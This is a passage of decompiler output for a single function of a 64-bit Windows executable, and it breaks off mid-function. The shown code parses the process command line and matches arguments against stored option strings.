// ==== FUN_140001000 @ 140001000 size 6627

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_140001000(undefined8 param_1,undefined8 param_2,longlong *param_3,ushort *param_4)

{
  longlong *plVar1;
  longlong lVar2;
  ushort uVar3;
  ulonglong *puVar4;
  code *pcVar5;
  char *pcVar6;
  IUnknown *pProxy;
  IUnknownVtbl *pIVar7;
  _func_5156 *p_Var8;
  longlong *plVar9;
  _func_5158 *p_Var10;
  undefined8 uVar11;
  longlong lVar12;
  short sVar13;
  undefined1 auVar14 [15];
  undefined1 auVar15 [15];
  undefined1 auVar16 [15];
  undefined1 auVar17 [15];
  undefined1 auVar18 [15];
  undefined1 auVar19 [15];
  undefined8 uVar20;
  undefined1 auVar21 [15];
  short sVar22;
  undefined1 auVar23 [15];
  undefined1 auVar24 [15];
  void *pvVar25;
  uint uVar26;
  undefined4 uVar27;
  DWORD DVar28;
  int iVar29;
  int iVar30;
  HRESULT HVar31;
  UINT UVar32;
  ulonglong uVar33;
  longlong lVar34;
  undefined8 uVar35;
  undefined7 uVar43;
  char *pcVar36;
  HANDLE pvVar37;
  BSTR bstrString;
  IID *riid;
  void **ppvObject;
  SAFEARRAY *psa;
  SAFEARRAY *pSVar38;
  undefined1 (*pauVar39) [16];
  LPCSTR pCVar40;
  HMODULE hModule;
  INT_PTR IVar41;
  INT_PTR IVar42;
  longlong lVar44;
  short sVar45;
  uint uVar46;
  ulonglong *puVar47;
  undefined *puVar48;
  LPSTR pCVar49;
  undefined1 *puVar50;
  ulonglong uVar51;
  longlong lVar52;
  longlong lVar53;
  longlong *plVar54;
  longlong *plVar55;
  ushort *puVar56;
  ulonglong uVar57;
  ulonglong uVar58;
  ulonglong uVar59;
  ulonglong uVar60;
  longlong lVar61;
  undefined8 *puVar62;
  bool bVar63;
  undefined1 auVar64 [16];
  undefined8 unaff_XMM6_Qa;
  undefined8 unaff_XMM6_Qb;
  WCHAR aWStackX_20 [4];
  ulonglong uStack_48;
  
  uStack_48 = 0x140001016;
  uVar33 = FUN_14000d5c2();
  lVar12 = -uVar33;
  puVar47 = (ulonglong *)(&stack0x00000040 + lVar12);
  *(undefined8 *)(&stack0x00001560 + lVar12) = unaff_XMM6_Qa;
  *(undefined8 *)(&stack0x00001568 + lVar12) = unaff_XMM6_Qb;
  do {
    lVar61 = *param_3;
    param_3 = param_3 + 1;
  } while (lVar61 != 0);
  uVar3 = *(ushort *)(*(longlong *)((longlong)ProcessEnvironmentBlock + 0x20) + 0x70);
  if (uVar3 == 0) {
    uVar33 = 0;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 2;
    lVar61 = *(longlong *)((longlong)&uStack_48 + lVar12);
  }
  else {
    uVar33 = (ulonglong)(uVar3 >> 1);
    lVar61 = *(longlong *)(*(longlong *)((longlong)ProcessEnvironmentBlock + 0x20) + 0x78);
  }
  *(undefined8 *)(&stack0x00001030 + lVar12) = _DAT_1400172b0;
  *(undefined8 *)(&stack0x00001038 + lVar12) = _UNK_1400172b8;
  *(undefined8 *)(&stack0x00001040 + lVar12) = 0;
  *(undefined8 *)(&stack0x00001048 + lVar12) = 0;
  *(undefined8 *)(&stack0x000014a0 + lVar12) = _DAT_1400172b0;
  *(undefined8 *)(&stack0x000014a8 + lVar12) = _UNK_1400172b8;
  *(undefined8 *)(&stack0x000014b0 + lVar12) = 0;
  *(undefined8 *)(&stack0x000014b8 + lVar12) = 0;
  *(undefined1 **)(&stack0x00001340 + lVar12) = &stack0x000014a0 + lVar12;
  *(undefined ***)(&stack0x00001348 + lVar12) = &PTR_FUN_14002dd80;
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 1;
  *(longlong *)(&stack0x00001558 + lVar12) = lVar61;
  *(longlong *)(&stack0x00001538 + lVar12) = *(longlong *)((longlong)&uStack_48 + lVar12);
  if (uVar33 == 0) {
    lVar61 = *(longlong *)((longlong)&uStack_48 + lVar12);
  }
  lVar52 = 0;
  uVar57 = 0;
  while (uVar57 != uVar33 * 2) {
    uVar3 = *(ushort *)(lVar61 + uVar57);
    *(ushort *)(&stack0x000013c0 + lVar12) = uVar3;
    uVar59 = uVar57 + 2;
    if (((uVar3 & 0xfc00) == 0xd800) && (uVar59 < uVar33 * 2)) {
      *(undefined2 *)(&stack0x000013c2 + lVar12) = *(undefined2 *)(lVar61 + uVar59);
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001107;
      FUN_1400084f1((undefined8 *)(&stack0x000012b0 + lVar12),(ushort *)(&stack0x000013c0 + lVar12))
      ;
      if (*(short *)(&stack0x000012b4 + lVar12) != 0) goto LAB_140001111;
      uVar26 = (uint)CONCAT12((&stack0x000012b2)[lVar12],*(undefined2 *)(&stack0x000012b0 + lVar12))
      ;
      uVar59 = uVar57 + 4;
    }
    else {
LAB_140001111:
      uVar26 = (uint)uVar3;
    }
    *(short *)(&stack0x00001450 + lVar12) = (short)uVar26;
    uVar46 = uVar26 >> 0x10 & 0x1f;
    (&stack0x00001452)[lVar12] = (char)uVar46;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001140;
    FUN_140008399((undefined4 *)(&stack0x00001410 + lVar12),uVar46 << 0x10 | uVar26 & 0xffff);
    lVar52 = lVar52 + (ulonglong)(byte)(&stack0x00001412)[lVar12];
    uVar57 = uVar59;
  }
  *(undefined1 **)(&stack0x00001058 + lVar12) = &stack0x000014a0 + lVar12;
  *(undefined ***)(&stack0x00001060 + lVar12) = &PTR_FUN_14002dd80;
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001199;
  FUN_140007051((longlong *)(&stack0x00001160 + lVar12),(undefined8 *)(&stack0x00001058 + lVar12),
                lVar52 + 1);
  if (*(short *)(&stack0x00001170 + lVar12) == 0) {
    plVar55 = (longlong *)((longlong)aWStackX_20 + lVar12);
    *(undefined1 (*) [16])(&stack0x00000058 + lVar12) = (undefined1  [16])0x0;
    *plVar55 = (longlong)(&stack0x000014a0 + lVar12);
    *(undefined ***)(&stack0x00000028 + lVar12) = &PTR_FUN_14002dd80;
    *(undefined8 *)(&stack0x00000030 + lVar12) = *(undefined8 *)(&stack0x00001558 + lVar12);
    *(ulonglong *)(&stack0x00000038 + lVar12) = uVar33;
    *(undefined8 *)(&stack0x00000040 + lVar12) = 0;
    *(undefined8 *)(&stack0x00000048 + lVar12) = *(undefined8 *)(&stack0x00001160 + lVar12);
    *(undefined8 *)(&stack0x00000050 + lVar12) = *(undefined8 *)(&stack0x00001168 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 8;
    uVar59 = 0;
    *(undefined8 *)(&stack0x00001550 + lVar12) = 0;
    *(undefined8 *)(&stack0x00001540 + lVar12) = 0;
    uVar57 = 0;
    *(undefined8 *)(&stack0x00001530 + lVar12) = 0;
    lVar61 = *(longlong *)((longlong)&uStack_48 + lVar12);
LAB_14000120e:
    puVar56 = (ushort *)(&stack0x000013c0 + lVar12);
    *(ulonglong *)(&stack0x00001558 + lVar12) = uVar57;
    if (uVar59 == 0) {
      if ((uVar33 == 0) || (**(short **)(&stack0x00000030 + lVar12) == 0)) goto LAB_1400012fe;
      uVar57 = 0;
      uVar27 = 0;
      bVar63 = false;
      while (uVar57 != uVar33) {
        uVar3 = *(ushort *)(*(longlong *)(&stack0x00000030 + lVar12) + uVar57 * 2);
        if ((uVar3 == 9) || (uVar3 == 0x20)) {
          if (!bVar63) {
            *puVar47 = uVar57 + 1;
            break;
          }
          *(undefined4 *)(&stack0x000013c0 + lVar12) = uVar27;
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400012ce;
          param_4 = puVar56;
          FUN_14000b510((ushort *)(&stack0x000012b0 + lVar12),(longlong)plVar55,uVar3,puVar56);
          bVar63 = true;
          uVar27 = *(undefined4 *)(&stack0x000012b0 + lVar12);
        }
        else if (uVar3 == 0x22) {
          bVar63 = (bool)(bVar63 ^ 1);
        }
        else {
          if (uVar3 == 0) break;
          *(undefined4 *)(&stack0x00001058 + lVar12) = uVar27;
          param_4 = (ushort *)(&stack0x00001058 + lVar12);
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400012a4;
          FUN_14000b510((ushort *)(&stack0x00001160 + lVar12),(longlong)plVar55,uVar3,param_4);
          uVar27 = *(undefined4 *)(&stack0x00001160 + lVar12);
        }
        uVar33 = *(ulonglong *)(&stack0x00000038 + lVar12);
        uVar57 = *puVar47 + 1;
        *puVar47 = uVar57;
      }
      goto LAB_1400014cd;
    }
    for (; uVar57 = uVar33, uVar33 != uVar59; uVar59 = uVar59 + 1) {
      sVar45 = *(short *)(*(longlong *)(&stack0x00000030 + lVar12) + uVar59 * 2);
      if ((sVar45 != 9) && (sVar45 != 0x20)) {
        uVar57 = uVar59;
        if (sVar45 != 0) {
          *puVar47 = uVar59;
          uVar27 = 0;
          uVar57 = 0;
          bVar63 = false;
          goto LAB_140001312;
        }
        break;
      }
    }
    *puVar47 = uVar57;
LAB_1400012fe:
    lVar52 = 0;
    lVar53 = 0;
    goto LAB_1400014f1;
  }
LAB_140001861:
  puVar62 = (undefined8 *)((longlong)aWStackX_20 + lVar12);
LAB_140001865:
  uVar35 = *(undefined8 *)(&stack0x000014a0 + lVar12);
  uVar11 = *(undefined8 *)(&stack0x000014a8 + lVar12);
  uVar20 = *(undefined8 *)(&stack0x000014b8 + lVar12);
  puVar62[2] = *(undefined8 *)(&stack0x000014b0 + lVar12);
  puVar62[3] = uVar20;
  *puVar62 = uVar35;
  puVar62[1] = uVar11;
  uVar35 = *puVar62;
  lVar61 = puVar62[1];
  uVar11 = puVar62[3];
  *(undefined8 *)(&stack0x00001058 + lVar12) = puVar62[2];
  *(undefined8 *)(&stack0x00001060 + lVar12) = uVar11;
  for (lVar52 = 0; lVar52 != 2; lVar52 = lVar52 + 1) {
    puVar47 = *(ulonglong **)(&stack0x00001058 + lVar52 * 8 + lVar12);
    while (puVar47 != (ulonglong *)0x0) {
      uVar33 = *puVar47;
      puVar4 = (ulonglong *)puVar47[2];
      *(undefined8 *)(&stack0xffffffffffffffe0 + lVar12) =
           *(undefined8 *)(&stack0x000015b8 + lVar12);
      pcVar5 = *(code **)(lVar61 + 0x18);
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400018c6;
      (*pcVar5)(uVar35,puVar47,uVar33 & 0xfffffffffffffffe,3);
      puVar47 = puVar4;
    }
  }
  return 0;
LAB_140001312:
  if (uVar59 == uVar33) goto LAB_1400014a5;
  uVar3 = *(ushort *)(*(longlong *)(&stack0x00000030 + lVar12) + uVar59 * 2);
  if ((uVar3 == 9) || (uVar3 == 0x20)) {
    *(undefined4 *)(&stack0x00001478 + lVar12) = uVar27;
    param_4 = (ushort *)(&stack0x00001478 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400013a8;
    FUN_14000b4d9((undefined4 *)(&stack0x00001450 + lVar12),(longlong)plVar55,uVar57,
                  (undefined4 *)param_4);
    if (!bVar63) goto LAB_1400014cd;
    *(undefined4 *)(&stack0x00001410 + lVar12) = *(undefined4 *)(&stack0x00001450 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400013d2;
    FUN_14000b510(puVar56,(longlong)plVar55,uVar3,(ushort *)(&stack0x00001410 + lVar12));
    bVar63 = true;
    uVar27 = *(undefined4 *)(&stack0x000013c0 + lVar12);
LAB_14000148f:
    uVar57 = 0;
  }
  else {
    if (uVar3 == 0x22) {
      *(undefined4 *)(&stack0x00001440 + lVar12) = uVar27;
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001409;
      FUN_14000b4d9((undefined4 *)(&stack0x000014e8 + lVar12),(longlong)plVar55,uVar57 >> 1,
                    (undefined4 *)(&stack0x00001440 + lVar12));
      uVar27 = *(undefined4 *)(&stack0x000014e8 + lVar12);
      if ((uVar57 & 1) == 0) {
        if (((bVar63) && (*puVar47 + 1 != *(longlong *)(&stack0x00000038 + lVar12))) &&
           (*(short *)(*(longlong *)(&stack0x00000030 + lVar12) + 2 + *puVar47 * 2) == 0x22)) {
          *(undefined4 *)(&stack0x00001290 + lVar12) = uVar27;
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001455;
          FUN_14000b510((ushort *)(&stack0x000013a0 + lVar12),(longlong)plVar55,0x22,
                        (ushort *)(&stack0x00001290 + lVar12));
          *puVar47 = *puVar47 + 1;
          uVar27 = *(undefined4 *)(&stack0x000013a0 + lVar12);
          bVar63 = true;
        }
        else {
          bVar63 = (bool)(bVar63 ^ 1);
        }
      }
      else {
        *(undefined4 *)(&stack0x00001500 + lVar12) = uVar27;
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001489;
        FUN_14000b510((ushort *)(&stack0x000014d0 + lVar12),(longlong)plVar55,0x22,
                      (ushort *)(&stack0x00001500 + lVar12));
        uVar27 = *(undefined4 *)(&stack0x000014d0 + lVar12);
      }
      goto LAB_14000148f;
    }
    if (uVar3 != 0x5c) {
      if (uVar3 != 0) {
        *(undefined4 *)(&stack0x000012b0 + lVar12) = uVar27;
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001369;
        FUN_14000b4d9((undefined4 *)(&stack0x00001058 + lVar12),(longlong)plVar55,uVar57,
                      (undefined4 *)(&stack0x000012b0 + lVar12));
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000137e;
        FUN_14000b510((ushort *)(&stack0x00001160 + lVar12),(longlong)plVar55,uVar3,
                      (ushort *)(&stack0x00001058 + lVar12));
        uVar27 = *(undefined4 *)(&stack0x00001160 + lVar12);
        goto LAB_14000148f;
      }
      goto LAB_1400014a5;
    }
    uVar57 = uVar57 + 1;
  }
  uVar33 = *(ulonglong *)(&stack0x00000038 + lVar12);
  uVar59 = *puVar47 + 1;
  *puVar47 = uVar59;
  goto LAB_140001312;
LAB_1400014a5:
  *(undefined4 *)(&stack0x00001400 + lVar12) = uVar27;
  param_4 = (ushort *)(&stack0x00001400 + lVar12);
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400014c4;
  FUN_14000b4d9((undefined4 *)(&stack0x00001330 + lVar12),(longlong)plVar55,uVar57,
                (undefined4 *)param_4);
LAB_1400014cd:
  lVar52 = *(longlong *)(&stack0x00000048 + lVar12);
  lVar34 = *(longlong *)(&stack0x00000060 + lVar12);
  *(undefined1 *)(lVar52 + lVar34) = 0;
  lVar52 = lVar52 + *(longlong *)(&stack0x00000058 + lVar12);
  lVar53 = lVar34 - *(longlong *)(&stack0x00000058 + lVar12);
  *(longlong *)(&stack0x00000060 + lVar12) = lVar34 + 1;
  *(longlong *)(&stack0x00000058 + lVar12) = lVar34 + 1;
LAB_1400014f1:
  uVar33 = *(ulonglong *)(&stack0x00001540 + lVar12);
  uVar57 = *(ulonglong *)(&stack0x00001550 + lVar12);
  if (lVar52 == 0) {
    bVar63 = *(ulonglong *)(&stack0x00001558 + lVar12) >> 0x3c != 0;
    (&stack0x00001160)[lVar12] = bVar63;
    if (bVar63) goto LAB_140001861;
    uVar33 = *(ulonglong *)(&stack0x00001558 + lVar12) * 0x10;
    if (CARRY8(uVar33,uVar57)) goto LAB_140001861;
    *(undefined1 **)(&stack0x00001528 + lVar12) = &stack0x00001340 + lVar12;
    *(undefined8 *)(&stack0x00001498 + lVar12) = *(undefined8 *)(&stack0x000015b8 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000191b;
    FUN_14000b48b((longlong *)(&stack0x00001160 + lVar12),(undefined8 *)(&stack0x00001340 + lVar12),
                  uVar33 + uVar57);
    if (*(short *)(&stack0x00001168 + lVar12) != 0) goto LAB_140001861;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 8;
    lVar52 = *(longlong *)((longlong)&uStack_48 + lVar12);
    if (uVar33 != 0) {
      lVar52 = *(longlong *)(&stack0x00001160 + lVar12);
    }
    lVar53 = *(longlong *)(&stack0x00001160 + lVar12) + uVar33;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001956;
    FUN_14000d5a5(lVar53,*(longlong *)(&stack0x00001538 + lVar12),uVar57);
    plVar55 = (longlong *)(lVar52 + 8);
    lVar34 = 0;
    uVar57 = *(ulonglong *)(&stack0x00001558 + lVar12);
    for (uVar59 = 0; uVar57 != uVar59; uVar59 = uVar59 + 1) {
      lVar44 = *(longlong *)(lVar61 + uVar59 * 8);
      plVar55[-1] = lVar53 + lVar34;
      *plVar55 = lVar44;
      lVar34 = lVar34 + lVar44 + 1;
      plVar55 = plVar55 + 2;
    }
    uVar57 = uVar57 & 0xfffffffffffffff;
    if (uVar33 == 0) {
      uVar57 = 0;
    }
    puVar48 = &DAT_140017238;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xb;
    uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400019a9;
    uVar35 = FUN_14000ae64((longlong)(&stack0x00001020 + lVar12),0x140017238,uVar33);
    *(undefined8 *)(&stack0x00001550 + lVar12) = uVar35;
    *(undefined **)(&stack0x00001530 + lVar12) = puVar48;
    puVar48 = &DAT_140017243;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xc;
    uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400019ce;
    uVar35 = FUN_14000ae64((longlong)(&stack0x00001400 + lVar12),0x140017243,uVar33);
    *(undefined8 *)(&stack0x00001548 + lVar12) = uVar35;
    *(undefined **)(&stack0x00001538 + lVar12) = puVar48;
    puVar48 = &DAT_14001724f;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x2e;
    uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400019f3;
    uVar35 = FUN_14000ae64((longlong)(&stack0x000012b0 + lVar12),0x14001724f,uVar33);
    *(undefined8 *)(&stack0x000014c0 + lVar12) = uVar35;
    *(undefined **)(&stack0x000014c8 + lVar12) = puVar48;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 1;
    uVar33 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
    uVar43 = (undefined7)((ulonglong)uVar35 >> 8);
    *(int *)(&stack0x00001540 + lVar12) = (int)CONCAT71(uVar43,1);
    *(int *)(&stack0x00001518 + lVar12) = (int)CONCAT71(uVar43,1);
    *(int *)(&stack0x00001520 + lVar12) = (int)CONCAT71(uVar43,1);
    *(ulonglong *)(&stack0x00001558 + lVar12) = uVar57;
LAB_140001a2b:
    if (uVar57 <= uVar33) goto LAB_140001cb5;
    lVar61 = uVar33 * 0x10;
    pcVar6 = *(char **)(lVar52 + lVar61);
    uVar59 = *(ulonglong *)(lVar52 + 8 + lVar61);
    puVar48 = &DAT_14001727d;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 2;
    uVar57 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001a5a;
    pcVar36 = (char *)FUN_14000ae64(0x1400347a0,0x14001727d,uVar57);
    uVar57 = *(ulonglong *)(&stack0x00001558 + lVar12);
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001a72;
    uVar60 = FUN_14000ad55(pcVar6,uVar59,pcVar36,(ulonglong)puVar48);
    uVar59 = uVar33 + 1;
    if (((uVar60 & 1) == 0) || (uVar57 <= uVar59)) {
      puVar62 = (undefined8 *)(lVar61 + lVar52);
      pcVar6 = (char *)*puVar62;
      uVar60 = puVar62[1];
      puVar48 = &DAT_14001727f;
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 2;
      uVar57 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001abc;
      pcVar36 = (char *)FUN_14000ae64(0x1400347a0,0x14001727f,uVar57);
      uVar57 = *(ulonglong *)(&stack0x00001558 + lVar12);
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001ad4;
      uVar60 = FUN_14000ad55(pcVar6,uVar60,pcVar36,(ulonglong)puVar48);
      if (((uVar60 & 1) == 0) || (uVar57 <= uVar59)) {
        pcVar6 = (char *)*puVar62;
        uVar57 = puVar62[1];
        puVar48 = &DAT_140017281;
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xc;
        uVar60 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001b20;
        pcVar36 = (char *)FUN_14000ae64(0x1400347a0,0x140017281,uVar60);
        *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001b31;
        uVar57 = FUN_14000ad55(pcVar6,uVar57,pcVar36,(ulonglong)puVar48);
        if ((uVar57 & 1) == 0) {
          pcVar6 = (char *)*puVar62;
          uVar57 = puVar62[1];
          puVar48 = &DAT_14001728d;
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 10;
          uVar60 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001b57;
          pcVar36 = (char *)FUN_14000ae64(0x1400347a0,0x14001728d,uVar60);
          *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001b68;
          uVar57 = FUN_14000ad55(pcVar6,uVar57,pcVar36,(ulonglong)puVar48);
          if ((uVar57 & 1) == 0) {
            pcVar6 = (char *)*puVar62;
            uVar57 = puVar62[1];
            puVar48 = &DAT_140017297;
            *(undefined8 *)((longlong)&uStack_48 + lVar12) = 9;
            uVar60 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
            *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001b96;
            pcVar36 = (char *)FUN_14000ae64(0x1400347a0,0x140017297,uVar60);
            *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001ba7;
            uVar57 = FUN_14000ad55(pcVar6,uVar57,pcVar36,(ulonglong)puVar48);
            if ((uVar57 & 1) == 0) {
              pcVar6 = (char *)*puVar62;
              uVar57 = puVar62[1];
              puVar48 = &DAT_1400172a0;
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xc;
              uVar60 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001bd5;
              pcVar36 = (char *)FUN_14000ae64(0x1400347a0,0x1400172a0,uVar60);
              *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001be6;
              uVar57 = FUN_14000ad55(pcVar6,uVar57,pcVar36,(ulonglong)puVar48);
              if ((uVar57 & 1) == 0) {
                pcVar6 = (char *)*puVar62;
                uVar57 = puVar62[1];
                puVar48 = &DAT_1400172ac;
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 2;
                uVar60 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001c28;
                pcVar36 = (char *)FUN_14000ae64(0x1400347a0,0x1400172ac,uVar60);
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001c39;
                uVar60 = FUN_14000ad55(pcVar6,uVar57,pcVar36,(ulonglong)puVar48);
                uVar57 = *(ulonglong *)(&stack0x00001558 + lVar12);
                if (((uVar60 & 1) != 0) && (uVar59 < uVar57)) {
                  *(undefined8 *)(&stack0x000014c0 + lVar12) =
                       *(undefined8 *)(lVar52 + uVar59 * 0x10);
                  *(undefined8 *)(&stack0x000014c8 + lVar12) =
                       *(undefined8 *)(lVar52 + 8 + uVar59 * 0x10);
                  goto LAB_140001c02;
                }
                pcVar6 = (char *)*puVar62;
                uVar59 = puVar62[1];
                puVar48 = &DAT_1400172ae;
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 2;
                uVar57 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001c89;
                pcVar36 = (char *)FUN_14000ae64(0x1400347a0,0x1400172ae,uVar57);
                uVar57 = *(ulonglong *)(&stack0x00001558 + lVar12);
                *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001ca1;
                uVar60 = FUN_14000ad55(pcVar6,uVar59,pcVar36,(ulonglong)puVar48);
                uVar59 = uVar33;
                if ((uVar60 & 1) != 0) {
                  puVar62 = (undefined8 *)(&stack0x00001290 + lVar12);
                  goto LAB_140001865;
                }
                goto LAB_140001c02;
              }
              *(undefined4 *)(&stack0x00001520 + lVar12) = 0;
            }
            else {
              *(undefined4 *)(&stack0x00001518 + lVar12) = 0;
            }
          }
          else {
            *(undefined4 *)(&stack0x00001540 + lVar12) = 0;
          }
        }
        uVar57 = *(ulonglong *)(&stack0x00001558 + lVar12);
        uVar59 = uVar33;
      }
      else {
        *(undefined8 *)(&stack0x00001548 + lVar12) = *(undefined8 *)(lVar52 + uVar59 * 0x10);
        *(undefined8 *)(&stack0x00001538 + lVar12) = *(undefined8 *)(lVar52 + 8 + uVar59 * 0x10);
      }
    }
    else {
      *(undefined8 *)(&stack0x00001550 + lVar12) = *(undefined8 *)(lVar52 + uVar59 * 0x10);
      *(undefined8 *)(&stack0x00001530 + lVar12) = *(undefined8 *)(lVar52 + 8 + uVar59 * 0x10);
    }
LAB_140001c02:
    uVar33 = uVar59 + 1;
    goto LAB_140001a2b;
  }
  uVar59 = lVar53 + 1;
  bVar63 = CARRY8(uVar57,uVar59);
  uVar60 = uVar57 + uVar59;
  (&stack0x00001160)[lVar12] = bVar63;
  (&stack0x00001058)[lVar12] = bVar63;
  if (bVar63) goto LAB_140001861;
  *(longlong *)(&stack0x00001548 + lVar12) = lVar53;
  if (uVar33 < uVar60) {
    uVar58 = (uVar60 >> 1) + 0x80;
    *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xffffffffffffffff;
    lVar53 = uVar58 + uVar60;
    if (CARRY8(uVar58,uVar60)) {
      lVar53 = *(longlong *)((longlong)&uStack_48 + lVar12);
    }
    if (uVar33 == 0) {
LAB_140001593:
      lVar34 = 0;
      lVar44 = 0;
    }
    else {
      *(undefined8 *)(&stack0xffffffffffffffe8 + lVar12) =
           *(undefined8 *)(&stack0x000015b8 + lVar12);
      *(longlong *)(&stack0xffffffffffffffe0 + lVar12) = lVar53;
      param_4 = (ushort *)0x0;
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x14000157d;
      lVar34 = FUN_14000afc2((longlong)(&stack0x000014a0 + lVar12),
                             *(longlong *)(&stack0x00001538 + lVar12),uVar33,0,
                             *(ulonglong *)(&stack0xffffffffffffffe0 + lVar12));
      lVar44 = lVar53;
      if (lVar34 == 0) goto LAB_140001593;
    }
    if (lVar34 == 0) {
      *(undefined1 **)(&stack0x00001058 + lVar12) = &stack0x000014a0 + lVar12;
      *(undefined ***)(&stack0x00001060 + lVar12) = &PTR_FUN_14002dd80;
      param_4 = *(ushort **)(&stack0x000015b8 + lVar12);
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x1400015e1;
      FUN_1400070bf((longlong *)(&stack0x00001160 + lVar12),
                    (undefined8 *)(&stack0x00001058 + lVar12),lVar53);
      if (*(short *)(&stack0x00001168 + lVar12) != 0) goto LAB_140001861;
      *(longlong *)(&stack0x00001518 + lVar12) = *(longlong *)(&stack0x00001160 + lVar12);
      lVar34 = *(longlong *)(&stack0x00001538 + lVar12);
      uVar57 = *(ulonglong *)(&stack0x00001550 + lVar12);
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001616;
      FUN_14000d5a5(*(longlong *)(&stack0x00001160 + lVar12),lVar34,uVar57);
      *(undefined1 **)(&stack0x000012b0 + lVar12) = &stack0x000014a0 + lVar12;
      *(undefined ***)(&stack0x000012b8 + lVar12) = &PTR_FUN_14002dd80;
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001648;
      FUN_140007021((undefined8 *)(&stack0x000012b0 + lVar12),lVar34,
                    *(longlong *)(&stack0x00001540 + lVar12));
      lVar34 = *(longlong *)(&stack0x00001518 + lVar12);
      *(longlong *)(&stack0x00001540 + lVar12) = lVar53;
    }
    else {
      *(longlong *)(&stack0x00001540 + lVar12) = lVar44;
    }
    lVar53 = *(longlong *)(&stack0x00001548 + lVar12);
  }
  else {
    lVar34 = *(longlong *)(&stack0x00001538 + lVar12);
  }
  *(longlong *)(&stack0x00001538 + lVar12) = lVar34;
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001675;
  FUN_14000d5a5(uVar57 + lVar34,lVar52,uVar59);
  uVar33 = *(ulonglong *)(&stack0x00001558 + lVar12);
  uVar57 = uVar33 + 1;
  uVar58 = *(ulonglong *)(&stack0x00001530 + lVar12);
  lVar52 = lVar61;
  if (uVar33 < uVar58) goto LAB_14000173b;
  uVar51 = (uVar57 >> 1) + 0x10;
  *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0xffffffffffffffff;
  uVar59 = uVar51 + uVar57;
  if (CARRY8(uVar51,uVar57)) {
    uVar59 = *(ulonglong *)((longlong)&uStack_48 + lVar12);
  }
  if (uVar58 == 0) {
    lVar52 = 0;
    uVar58 = 0;
  }
  else {
    (&stack0x00001160)[lVar12] = 0x1fffffffffffffff < uVar59;
    if (uVar59 < 0x2000000000000000) {
      *(undefined8 *)(&stack0xffffffffffffffe8 + lVar12) =
           *(undefined8 *)(&stack0x000015b8 + lVar12);
      *(ulonglong *)(&stack0xffffffffffffffe0 + lVar12) = uVar59 * 8;
      param_4 = (ushort *)CONCAT71((int7)((ulonglong)param_4 >> 8),3);
      *(undefined8 *)((longlong)&uStack_48 + lVar12) = 0x140001701;
